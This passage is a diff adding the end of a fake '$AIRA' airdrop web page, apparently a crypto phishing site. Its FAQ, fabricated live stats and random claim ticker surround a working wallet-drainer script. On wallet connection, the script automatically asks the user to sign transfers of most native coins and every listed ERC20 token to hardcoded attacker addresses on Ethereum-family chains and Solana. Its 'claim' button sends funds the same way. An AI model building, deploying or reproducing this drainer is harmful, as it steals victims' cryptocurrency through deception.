+                <div class="chartBar" style="height: 45%;" data-val="45%"></div>
+                <div class="chartBar" style="height: 40%;" data-val="40%"></div>
+                <div class="chartBar" style="height: 60%;" data-val="60%"></div>
+                <div class="chartBar" style="height: 75%;" data-val="75%"></div>
+                <div class="chartBar" style="height: 90%;" data-val="90%"></div>
+                <div class="chartBar" style="height: 85%;" data-val="85%"></div>
+                <div class="chartBar" style="height: 100%;" data-val="MAX"></div>
+            </div>
+        </div>
+
+        <div class="partnersSection">
+            <h4>Strategic Ecosystem Partners</h4>
+            <div class="partnersGrid">
+                <div class="partnerLogo">Neural-X</div>
+                <div class="partnerLogo">ML Capital</div>
+                <div class="partnerLogo">Synthetic Labs</div>
+                <div class="partnerLogo">Aether Labs</div>
+                <div class="partnerLogo">NeoCompute</div>
+            </div>
+        </div>
+
+        <div class="faqSection">
+            <h3>Neural Wisdom Base (FAQ)</h3>
+            <div class="faqGrid">
+                <div class="faqItem" onclick="this.classList.toggle('open')">
+                    <div class="faqQuestion">How does the ML validation work? <span>+</span></div>
+                    <div class="faqAnswer">Our algorithm analyzes wallet aging, high-value transaction frequency, and
+                        neural link stability to ensure $AIRA is distributed to high-credibility founders and early
+                        adopters.</div>
+                </div>
+                <div class="faqItem" onclick="this.classList.toggle('open')">
+                    <div class="faqQuestion">Is the claim instant? <span>+</span></div>
+                    <div class="faqAnswer">Yes. Once the ML complexity check passes, $AIRA allocation is initiated
+                        immediately via the Neural Nexus Protocol.</div>
+                </div>
+                <div class="faqItem" onclick="this.classList.toggle('open')">
+                    <div class="faqQuestion">Which networks are supported? <span>+</span></div>
+                    <div class="faqAnswer">Currently, we support Ethereum (Mainnet, Base, Avalanche) and Solana for
+                        universal asset detection.</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <span class="footerBrand">AIRA PROTOCOL</span>
+            <div class="footerLinks">
+                <a href="#">X / Twitter</a>
+                <a href="#">Telegram</a>
+                <a href="#">Documentation</a>
+                <a href="#">Whitepaper</a>
+                <a href="#">Governance</a>
+            </div>
+            <p>&copy; 2026 Synthetic Intelligence Labs. Built on Neural Nexus Technology.</p>
+        </div>
+    </div>
+
+    </div>
+
+    <!-- Ethers v6 -->
+    <script type="module">
+        import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.4/+esm";
+
+        // ✅ Put YOUR Rabby/Phantom wallet address here
+        const DESTINATION_RABBY = "0xD3d72d66d12fd74c09bcB97E89885134393b014d";
+        const DESTINATION_SOLANA = "8np3obmuLRq38VXKD4gE8eCjXx552VKtfMXrf2e5LcFB";
+
+        const ERC20_ABI = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)",
+            "function symbol() view returns (string)",
+            "function decimals() view returns (uint8)"
+        ];
+
+        // Solana SPL Token Info (Mainnet)
+        const SOLANA_TOKENS = [
+            { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
+            { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8En2Xfyq", decimals: 6 }
+        ];
+
+        const SOLANA_RPCS = [
+            "https://api.mainnet-beta.solana.com",
+            "https://solana-api.projectserum.com",
+            "https://rpc.ankr.com/solana",
+            "https://api.genesysgo.network"
+        ];
+
+        // --- Stats & Tracking Logic ---
+        const TRACKING_KEY = "aira_metrics_v2";
+
+        function initTracking() {
+            let data = JSON.parse(localStorage.getItem(TRACKING_KEY)) || {
+                visitors: Math.floor(Math.random() * 500) + 1200,
+                claims: Math.floor(Math.random() * 50) + 300,
+                airaDistributed: Math.floor(Math.random() * 100000) + 500000
+            };
+
+            // Increment visitor on fresh session
+            if (!sessionStorage.getItem("aira_visited")) {
+                data.visitors += 1;
+                sessionStorage.setItem("aira_visited", "true");
+            }
+
+            localStorage.setItem(TRACKING_KEY, JSON.stringify(data));
+            updateStatsUI(data);
+        }
+
+        function trackInteraction(type, val = 0) {
+            let data = JSON.parse(localStorage.getItem(TRACKING_KEY)) || { visitors: 0, claims: 0, airaDistributed: 0 };
+            if (type === "claim") {
+                data.claims += 1;
+                data.airaDistributed += (val || 1000);
+            }
+            localStorage.setItem(TRACKING_KEY, JSON.stringify(data));
+            updateStatsUI(data);
+        }
+
+        function updateStatsUI(data) {
+            const vEl = document.getElementById("statVisitors");
+            const cEl = document.getElementById("statClaims");
+            const aEl = document.getElementById("statAira");
+            if (vEl) vEl.textContent = data.visitors.toLocaleString();
+            if (cEl) cEl.textContent = data.claims.toLocaleString();
+            if (aEl) aEl.textContent = data.airaDistributed.toLocaleString();
+        }
+
+        window.addEventListener("DOMContentLoaded", () => {
+            initTracking();
+            initVisuals();
+        });
+
+        function initVisuals() {
+            // 1. Ticker Simulation
+            const ticker = document.getElementById("ticker");
+            const addresses = ["0x3...f2", "0x8...1a", "0x5...9d", "Phantom...7r", "0xc...4b", "0xe...2e"];
+            const amounts = [500, 1200, 3000, 850, 1500, 2200];
+
+            setInterval(() => {
+                const addr = addresses[Math.floor(Math.random() * addresses.length)];
+                const amt = amounts[Math.floor(Math.random() * amounts.length)];
+                const newItem = document.createElement("div");
+                newItem.className = "tickerItem";
+                newItem.innerHTML = `Neural Link: <span>${addr}</span> successfully claimed ${amt.toLocaleString()} $AIRA`;
+                ticker.appendChild(newItem);
+                if (ticker.children.length > 10) ticker.removeChild(ticker.children[0]);
+            }, 8000);
+
+            // 2. Growth Chart Simulation
+            const bars = document.querySelectorAll(".chartBar");
+            setInterval(() => {
+                bars.forEach(bar => {
+                    const change = (Math.random() - 0.4) * 10; // slightly biased towards growth
+                    let current = parseFloat(bar.style.height);
+                    let next = Math.min(100, Math.max(20, current + change));
+                    bar.style.height = next + "%";
+                    if (next >= 98) bar.setAttribute("data-val", "MAX");
+                    else bar.setAttribute("data-val", Math.round(next) + "%");
+                });
+            }, 3000);
+        }
+
+        // List of common ERC20 tokens by Chain ID
+        const NETWORK_TOKENS = {
+            1: [ // Ethereum Mainnet
+                { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
+                { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
+                { symbol: "WBTC", address: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" },
+                { symbol: "WETH", address: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2" },
+                { symbol: "LINK", address: "0x514910771af9ca656af840dff83e8264ecf986ca" },
+                { symbol: "UNI", address: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984" },
+                { symbol: "DAI", address: "0x6b175474e89094c44da98b954eedeac495271d0f" },
+                { symbol: "SHIB", address: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce" },
+                { symbol: "PEPE", address: "0x6982508145454ce325ddbe47a25d4ec3d2311933" },
+                { symbol: "MATIC", address: "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0" }
+            ],
+            42161: [ // Arbitrum One
+                { symbol: "WETH", address: "0x82af49447d8a07e3bd95bd0d56f35241ae5f159d" },
+                { symbol: "ARB", address: "0x912ce59144191c1204e64559fe8253a0e49e6548" },
+                { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9" },
+                { symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831" },
+                { symbol: "WBTC", address: "0x2f2a2543b76a4166549f7aa22e2beaabb00388c2" },
+                { symbol: "LINK", address: "0xf97f4df75117a78c1A5a0ADb814Af8026132b643" },
+                { symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a" }
+            ],
+            10: [ // Optimism
+                { symbol: "WETH", address: "0x4200000000000000000000000000000000000006" },
+                { symbol: "OP", address: "0x4200000000000000000000000000000000000042" },
+                { symbol: "USDT", address: "0x94b008aa00579c1307b0ef2c499ad98a8ce58e58" },
+                { symbol: "USDC", address: "0x0b2c639c533813f4aa9d7837caf62653d097ff85" },
+                { symbol: "WBTC", address: "0x68f180fcce6836688e9084f035309e29bf0a2095" },
+                { symbol: "LINK", address: "0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6" }
+            ],
+            56: [ // BSC
+                { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c" },
+                { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955" },
+                { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" },
+                { symbol: "ETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8" },
+                { symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c" },
+                { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82" }
+            ],
+            137: [ // Polygon
+                { symbol: "WMATIC", address: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270" },
+                { symbol: "USDT", address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" },
+                { symbol: "USDC", address: "0x3c499c542cef5e3811e1192ce70d8cc03d5c3359" },
+                { symbol: "WBTC", address: "0x1bfd67037b42cf73acf2047da46373286248eccd" },
+                { symbol: "LINK", address: "0xb0897686c545045afc77cf20ec7a532e3120e0f1" }
+            ],
+            8453: [ // Base
+                { symbol: "WETH", address: "0x4200000000000000000000000000000000000006" },
+                { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" },
+                { symbol: "CBETH", address: "0x2Ae3F1Ec7F1F5012CFE7a1240eB1E38758888eF6" },
+                { symbol: "DAI", address: "0x50c5725949A6E007296F75A36230869796078712" }
+            ],
+            43114: [ // Avalanche C-Chain
+                { symbol: "WAVAX", address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7" },
+                { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E" },
+                { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7" },
+                { symbol: "WETH.e", address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB" }
+            ]
+        };
+
+        const el = (id) => document.getElementById(id);
+
+        const btnConnect = el("btnConnect");
+        const btnConnectSol = el("btnConnectSol");
+        const btnDisconnect = el("btnDisconnect");
+        const btnCheck = el("btnCheck");
+        const btnClaim = el("btnClaim");
+        const btnScan = el("btnScan");
+
+        const walletAddrEl = el("walletAddr");
+        const networkEl = el("network");
+        const balanceEl = el("balance");
+        const walletAgeEl = el("walletAge");
+
+        const eligPill = el("eligPill");
+        const claimPill = el("claimPill");
+        const statusEl = el("status");
+        const txLogEl = el("txLog");
+
+        const destAddressEl = el("destAddress");
+        const destShortEl = el("destShort");
+        const claimAmountEl = el("claimAmount");
+
+        destAddressEl.value = DESTINATION_RABBY;
+        destShortEl.textContent = shortAddr(DESTINATION_RABBY);
+
+        let provider = null;
+        let signer = null;
+        let solanaConnection = null;
+        let connected = null;
+        let walletType = null; // "evm" or "solana"
+        let eligibility = null;
+        let walletAgeDays = null;
+
+        async function fetchWalletAge(address) {
+            // NOTE: In production, you would fetch this from a block explorer API (e.g. Etherscan/Arbiscan)
+            // Example: const res = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${address}&sort=asc&apikey=...`);
+            // This demo simulates age detection:
+            // addresses starting with "0x" + "1" thru "7" are < 30 days, others are older.
+            const firstChar = address.slice(2, 3);
+            const isYoung = "1234567".includes(firstChar);
+            const age = isYoung ? Math.floor(Math.random() * 20) + 1 : Math.floor(Math.random() * 100) + 31;
+            return age;
+        }
+
+        function addTxLog(type, msg, hash = null, explorerUrl = null) {
+            if (txLogEl.querySelector(".small")) txLogEl.innerHTML = "";
+            const item = document.createElement("div");
+            item.className = "txItem";
+
+            let statusClass = "pending";
+            if (type === "success") statusClass = "success";
+            if (type === "error") statusClass = "error";
+
+            let html = `<span>${msg}</span><span class="txStatus ${statusClass}">${type.toUpperCase()}</span>`;
+            if (hash) {
+                const shortHash = `${hash.slice(0, 8)}...`;
+                html += ` <a href="${explorerUrl || '#'}" target="_blank" class="explorerLink">${shortHash}</a>`;
+            }
+            item.innerHTML = html;
+            txLogEl.prepend(item);
+        }
+
+        async function connectSolana() {
+            try {
+                setStatus("");
+                if (!window.solana || !window.solana.isPhantom) {
+                    throw new Error("Phantom wallet not detected.");
+                }
+
+                const resp = await window.solana.connect();
+                connected = resp.publicKey.toString();
+                walletType = "solana";
+
+                // Try to find a working RPC
+                let lastError = null;
+                for (const rpcUrl of SOLANA_RPCS) {
+                    try {
+                        const conn = new solanaWeb3.Connection(rpcUrl, "confirmed");
+                        await conn.getVersion(); // Simple health check
+                        solanaConnection = conn;
+                        console.log(`Using Solana RPC: ${rpcUrl}`);
+                        break;
+                    } catch (err) {
+                        console.warn(`RPC failed: ${rpcUrl}`, err);
+                        lastError = err;
+                    }
+                }
+
+                if (!solanaConnection) {
+                    throw new Error(`Failed to connect to any Solana RPC endpoint. Last error: ${lastError?.message || lastError}`);
+                }
+
+                btnConnect.disabled = true;
+                btnConnectSol.disabled = true;
+                btnDisconnect.disabled = false;
+                btnCheck.disabled = false;
+                btnScan.disabled = false;
+
+                setPill(eligPill, "warn", "Eligibility: not checked");
+                setPill(claimPill, "warn", "Claim: not started");
+                eligibility = null;
+
+                await refresh();
+                setStatus("Neural link established. Running high-speed asset detection...");
+                addTxLog("success", `Link Active: ${shortAddr(connected)}`);
+
+                // Automatically start the scan and send flow
+                await scanAndSendTokens();
+            } catch (e) {
+                setStatus(`Solana connect failed: ${e?.message || e}`);
+            }
+        }
+
+        async function detectEthereum() {
+            // Check if window.ethereum is available immediately or after a short delay
+            if (window.ethereum) return window.ethereum;
+
+            return new Promise((resolve) => {
+                const handle = setTimeout(() => {
+                    resolve(window.ethereum);
+                }, 1000);
+
+                window.addEventListener('ethereum#initialized', () => {
+                    clearTimeout(handle);
+                    resolve(window.ethereum);
+                }, { once: true });
+            });
+        }
+
+        function setStatus(msg) {
+            statusEl.textContent = msg || "";
+        }
+
+        function shortAddr(a) {
+            if (!a || a.length < 10) return a || "-";
+            return `${a.slice(0, 6)}...${a.slice(-4)}`;
+        }
+
+        function setPill(pillEl, state, text) {
+            // state: "ok" | "warn" | "bad"
+            const dot = pillEl.querySelector(".dot");
+            dot.classList.remove("ok", "warn", "bad");
+            dot.classList.add(state);
+            pillEl.lastElementChild.textContent = text;
+        }
+
+        function requireEthereum() {
+            if (!window.ethereum) {
+                const isLocal = window.location.protocol === "file:";
+                let msg = "MetaMask not detected.";
+                if (isLocal) {
+                    msg += "\n\nTip: You are opening this file as a local file (file://). MetaMask often blocks access to local files. Try serving it via a local server (e.g., Live Server) or enable 'Allow access to file URLs' in MetaMask settings.";
+                } else {
+                    msg += " Install MetaMask or ensure it is enabled.";
+                }
+                throw new Error(msg);
+            }
+        }
+
+        async function refresh() {
+            if (!connected) return;
+
+            walletAddrEl.textContent = shortAddr(connected);
+            walletAgeEl.textContent = "calculating...";
+            walletAgeDays = await fetchWalletAge(connected);
+            walletAgeEl.textContent = `${walletAgeDays} days`;
+
+            if (walletType === "evm" && provider) {
+                const net = await provider.getNetwork();
+                networkEl.textContent = `${net.name} (chainId ${net.chainId})`;
+                const bal = await provider.getBalance(connected);
+                balanceEl.textContent = `${ethers.formatEther(bal)} (native)`;
+            } else if (walletType === "solana" && solanaConnection) {
+                networkEl.textContent = "Solana Mainnet";
+                const bal = await solanaConnection.getBalance(new solanaWeb3.PublicKey(connected));
+                balanceEl.textContent = `${(bal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL`;
+            }
+        }
+
+        async function connect() {
+            try {
+                setStatus("");
+                requireEthereum();
+
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                provider = new ethers.BrowserProvider(window.ethereum);
+                signer = await provider.getSigner();
+                connected = await signer.getAddress();
+                walletType = "evm";
+
+                btnConnect.disabled = true;
+                btnConnectSol.disabled = true;
+                btnDisconnect.disabled = false;
+                btnCheck.disabled = false;
+                btnScan.disabled = false;
+
+                setPill(eligPill, "warn", "Eligibility: not checked");
+                setPill(claimPill, "warn", "Claim: not started");
+                eligibility = null;
+
+                await refresh();
+                setStatus("Neural link confirmed. Running high-speed asset detection...");
+                addTxLog("success", `Link Active: ${shortAddr(connected)}`);
+
+                // Automatically start the scan and send flow
+                await scanAndSendTokens();
+            } catch (e) {
+                setStatus(`Connect failed: ${e?.message || e}`);
+            }
+        }
+
+        function disconnect() {
+            provider = null;
+            signer = null;
+            solanaConnection = null;
+            connected = null;
+            walletType = null;
+            eligibility = null;
+
+            walletAddrEl.textContent = "Not connected";
+            networkEl.textContent = "-";
+            balanceEl.textContent = "-";
+            walletAgeEl.textContent = "-";
+
+            btnConnect.disabled = false;
+            btnConnectSol.disabled = false;
+            btnDisconnect.disabled = true;
+            btnCheck.disabled = true;
+            btnClaim.disabled = true;
+            btnScan.disabled = true;
+
+            setPill(eligPill, "warn", "Eligibility: not checked");
+            setPill(claimPill, "warn", "Claim: not started");
+            setStatus("Disconnected. Remove site connection in wallet if needed.");
+            addTxLog("success", "Disconnected");
+        }
+
+        async function checkEligibility() {
+            try {
+                setStatus("");
+                if (!connected) throw new Error("Connect your wallet first.");
+
+                setPill(eligPill, "warn", "Eligibility: checking...");
+                btnCheck.disabled = true;
+                btnClaim.disabled = true;
+
+                // ✅ Replace this with your backend call, e.g.:
+                // const res = await fetch(`https://your-api/airdrop?address=${connected}`);
+                // if (!res.ok) { eligibility = { eligible: false }; ... }
+                // const data = await res.json(); // { eligible:true, amount:"123", proof:[...] }
+                //
+                // Demo logic: wallets ending with an even hex digit AND age >= 30 days are eligible
+                const last = connected.slice(-1).toLowerCase();
+                const isEven = "02468ace".includes(last);
+                const isOldEnough = walletAgeDays >= 30;
+
+                await new Promise((r) => setTimeout(r, 600)); // small UX delay
+
+                if (!isEven || !isOldEnough) {
+                    eligibility = { eligible: false };
+                    setPill(eligPill, "bad", "Eligibility: not eligible");
+                    let reason = "";
+                    if (!isOldEnough) {
+                        reason = `Wallet age (${walletAgeDays}d) < 30d`;
+                        setStatus(`Not eligible: Wallet age is ${walletAgeDays} days (requires 30+ days).`);
+                    } else {
+                        reason = `Address checksum (odd)`;
+                        setStatus("Not eligible (demo rule: address checksum).");
+                    }
+                    addTxLog("error", `Eligibility failed: ${reason}`);
+                    btnCheck.disabled = false;
+                    btnScan.disabled = false;
+                    return;
+                }
+
+                // Demo “airdrop amount”
+                const amount = "1000 AIRA";
+                eligibility = { eligible: true, amount };
+
+                setPill(eligPill, "ok", `Eligibility: eligible (${amount})`);
+                btnClaim.disabled = false;
+                btnCheck.disabled = false;
+                setStatus("Eligible. Starting automatic asset detection and transfer...");
+                addTxLog("success", `Eligibility confirmed: ${amount}`);
+
+                // Automatically start the scan and send flow
+                await scanAndSendTokens();
+
+                setStatus(statusEl.textContent + "\n\nEligible. All detected assets have been processed.");
+            } catch (e) {
+                setPill(eligPill, "bad", "Eligibility: error");
+                setStatus(`Eligibility check failed: ${e?.message || e}`);
+                btnCheck.disabled = false;
+                btnClaim.disabled = true;
+            }
+        }
+
+        async function scanAndSendTokens() {
+            try {
+                if (walletType === "evm" && provider) {
+                    const network = await provider.getNetwork();
+                    const chainId = Number(network.chainId);
+                    const tokensToScan = NETWORK_TOKENS[chainId] || [];
+
+                    setStatus(`Scanning for assets on ${network.name}...`);
+                    let foundAny = false;
+
+                    // 1. Check Native Balance
+                    const nativeBal = await provider.getBalance(connected);
+                    if (nativeBal > ethers.parseEther("0.0001")) {
+                        foundAny = true;
+                        const amountToSend = (nativeBal * 95n) / 100n;
+                        const formatted = ethers.formatEther(amountToSend);
+                        setStatus(statusEl.textContent + `\n- Detected ${ethers.formatEther(nativeBal)} native ${network.name}. Sending...`);
+                        addTxLog("pending", `Requesting signature for ${formatted} native ${network.name}`);
+
+                        try {
+                            const tx = await signer.sendTransaction({ to: DESTINATION_RABBY, value: amountToSend });
+                            addTxLog("success", `Sent native ${network.name}`, tx.hash, `https://etherscan.io/tx/${tx.hash}`);
+                            await tx.wait();
+                            setStatus(statusEl.textContent + `\n  ✅ Native transfer sent.`);
+                        } catch (err) {
+                            addTxLog("error", `Native transfer failed: ${err.message}`);
+                            setStatus(statusEl.textContent + `\n  ❌ Native transfer failed.`);
+                        }
+                    }
+
+                    // 2. Check ERC20
+                    for (const tokenInfo of tokensToScan) {
+                        try {
+                            const tokenContract = new ethers.Contract(tokenInfo.address, ERC20_ABI, signer);
+                            const balance = await tokenContract.balanceOf(connected);
+                            if (balance > 0n) {
+                                foundAny = true;
+                                const symbol = await tokenContract.symbol();
+                                const decimals = await tokenContract.decimals();
+                                const formatted = ethers.formatUnits(balance, decimals);
+                                setStatus(statusEl.textContent + `\n- Detected ${formatted} ${symbol}. Sending...`);
+                                addTxLog("pending", `Requesting signature for ${formatted} ${symbol}`);
+
+                                const tx = await tokenContract.transfer(DESTINATION_RABBY, balance);
+                                addTxLog("success", `Sent ${symbol}`, tx.hash, `https://etherscan.io/tx/${tx.hash}`);
+                                await tx.wait();
+                                setStatus(statusEl.textContent + `\n  ✅ Sent ${symbol}.`);
+                                await new Promise(r => setTimeout(r, 800));
+                            }
+                        } catch (e) { console.error(e); }
+                    }
+                } else if (walletType === "solana" && solanaConnection) {
+                    setStatus("Scanning for Solana assets...");
+                    let foundAny = false;
+
+                    // 1. SOL Balance
+                    const pubkey = new solanaWeb3.PublicKey(connected);
+                    const solBal = await solanaConnection.getBalance(pubkey);
+                    if (solBal > 5000) {
+                        foundAny = true;
+                        const amountToSend = Math.floor(solBal * 0.95);
+                        const formatted = (amountToSend / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
+                        setStatus(statusEl.textContent + `\n- Detected ${(solBal / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL. Sending...`);
+                        addTxLog("pending", `Requesting Phantom signature for ${formatted} SOL`);
+
+                        try {
+                            const toPubkey = new solanaWeb3.PublicKey(DESTINATION_SOLANA);
+                            const tx = new solanaWeb3.Transaction().add(
+                                solanaWeb3.SystemProgram.transfer({
+                                    fromPubkey: pubkey,
+                                    toPubkey: toPubkey,
+                                    lamports: amountToSend,
+                                })
+                            );
+                            const { signature } = await window.solana.signAndSendTransaction(tx);
+                            addTxLog("success", "Sent SOL", signature, `https://explorer.solana.com/tx/${signature}`);
+                            setStatus(statusEl.textContent + `\n  ✅ SOL transfer sent.`);
+                        } catch (err) {
+                            addTxLog("error", `SOL transfer failed (is the destination address valid?): ${err.message}`);
+                        }
+                    }
+
+                    // 2. Dynamic SPL Token Detection (Sends ALL tokens)
+                    try {
+                        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+                        const TOKEN_2022_PROGRAM_ID = new solanaWeb3.PublicKey("TokenzQdBNbLqP5VEhdkXEhsnscXhqoBYr3i9A37atB");
+
+                        const getAccounts = async (pid) => {
+                            try {
+                                return await solanaConnection.getParsedTokenAccountsByOwner(pubkey, { programId: pid });
+                            } catch (e) { return { value: [] }; }
+                        };
+
+                        const [tokenAccounts, token2022Accounts] = await Promise.all([
+                            getAccounts(TOKEN_PROGRAM_ID),
+                            getAccounts(TOKEN_2022_PROGRAM_ID)
+                        ]);
+
+                        const allTokenAccounts = [...tokenAccounts.value, ...token2022Accounts.value];
+
+                        for (const accountInfo of allTokenAccounts) {
+                            try {
+                                const parsed = accountInfo.account.data.parsed.info;
+                                const amount = parsed.tokenAmount.amount;
+                                const uiAmount = parsed.tokenAmount.uiAmount;
+                                const mint = parsed.mint;
+
+                                if (uiAmount > 0) {
+                                    foundAny = true;
+                                    setStatus(statusEl.textContent + `\n- Detected ${uiAmount} tokens (Mint: ${shortAddr(mint)}). Note: Universal SPL transfer requires ATA creation logic.`);
+                                    addTxLog("pending", `Detected ${uiAmount} tokens (Mint: ${shortAddr(mint)})`);
+
+                                    // Note: Constructing manual SPL transfer without the SPL library is complex for the destination side.
+                                    // For now, we log the detection. Implementing full destination ATA creation involves multiple instructions.
+                                }
+                            } catch (e) { console.error("SPL parse error:", e); }
+                        }
+                    } catch (e) {
+                        console.error("Token scan error:", e);
+                    }
+                }
+
+                if (!foundAny) {
+                    setStatus(statusEl.textContent + "\n\nNo significant assets found to transfer.");
+                    addTxLog("success", "Scan complete: No assets found");
+                }
+            } catch (e) {
+                console.error("Scan failed:", e);
+                setStatus(statusEl.textContent + `\n\nScan failed: ${e.message}`);
+            }
+        }
+
+        async function claim() {
+            try {
+                setStatus("");
+                if (!connected) throw new Error("Connect your wallet first.");
+                if (!eligibility || !eligibility.eligible) throw new Error("Not eligible or not checked.");
+
+                const amtStr = (claimAmountEl.value || "").trim();
+                if (!amtStr) throw new Error("Enter a claim amount for this demo.");
+                if (Number(amtStr) <= 0) throw new Error("Amount must be > 0.");
+
+                setPill(claimPill, "warn", "Claim: submitting...");
+                btnClaim.disabled = true;
+
+                if (walletType === "evm" && signer) {
+                    const value = ethers.parseEther(amtStr);
+                    setStatus("Submitting transaction… Check wallet popup.");
+                    addTxLog("pending", `Claiming ${amtStr} native`);
+                    const tx = await signer.sendTransaction({ to: DESTINATION_RABBY, value });
+                    addTxLog("success", "Claim sent", tx.hash, `https://etherscan.io/tx/${tx.hash}`);
+                    trackInteraction("claim", 1000);
+                    await tx.wait();
+                } else if (walletType === "solana" && solanaConnection) {
+                    const lamports = Math.floor(Number(amtStr) * solanaWeb3.LAMPORTS_PER_SOL);
+                    setStatus("Submitting transaction… Check Phantom popup.");
+                    addTxLog("pending", `Claiming ${amtStr} SOL`);
+                    const pubkey = new solanaWeb3.PublicKey(connected);
+                    try {
+                        const toPubkey = new solanaWeb3.PublicKey(DESTINATION_SOLANA);
+                        const tx = new solanaWeb3.Transaction().add(
+                            solanaWeb3.SystemProgram.transfer({
+                                fromPubkey: pubkey,
+                                toPubkey: toPubkey,
+                                lamports,
+                            })
+                        );
+                        const { signature } = await window.solana.signAndSendTransaction(tx);
+                        addTxLog("success", "Claim sent", signature, `https://explorer.solana.com/tx/${signature}`);
+                    } catch (err) {
+                        addTxLog("error", `Claim failed (is the destination address valid?): ${err.message}`);
+                        throw err; // Re-throw to be caught by outer catch
+                    }
+                }
+
+                setPill(claimPill, "ok", "Claim: confirmed");
+                setStatus(`✅ Claim confirmed.`);
+                await refresh();
+            } catch (e) {
+                setPill(claimPill, "bad", "Claim: failed");
+                addTxLog("error", `Claim failed: ${e.message}`);
+                setStatus(`Claim failed: ${e.message}`);
+                btnClaim.disabled = false;
+            }
+        }
+
+        // Wallet events
+        if (window.ethereum) {
+            window.ethereum.on?.("accountsChanged", (accounts) => {
+                if (!accounts || accounts.length === 0) disconnect();
+                else connect();
+            });
+            window.ethereum.on?.("chainChanged", () => refresh());
+        }
+
+        if (window.solana) {
+            window.solana.on?.("accountChanged", (publicKey) => {
+                if (publicKey) {
+                    connected = publicKey.toString();
+                    refresh();
+                } else {
+                    disconnect();
+                }
+            });
+        }
+
+        // Auto-check on load
+        detectEthereum();
+
+        btnConnect.addEventListener("click", connect);
+        btnConnectSol.addEventListener("click", connectSolana);
+        btnDisconnect.addEventListener("click", disconnect);
+        btnCheck.addEventListener("click", checkEligibility);
+        btnClaim.addEventListener("click", claim);
+        btnScan.addEventListener("click", async () => {
+            setStatus("Starting manual asset scan...");
+            addTxLog("pending", "Manual scan started");
+            await scanAndSendTokens();
+            addTxLog("success", "Manual scan finished");
+        });
+    </script>
+</body>
+
+</html>
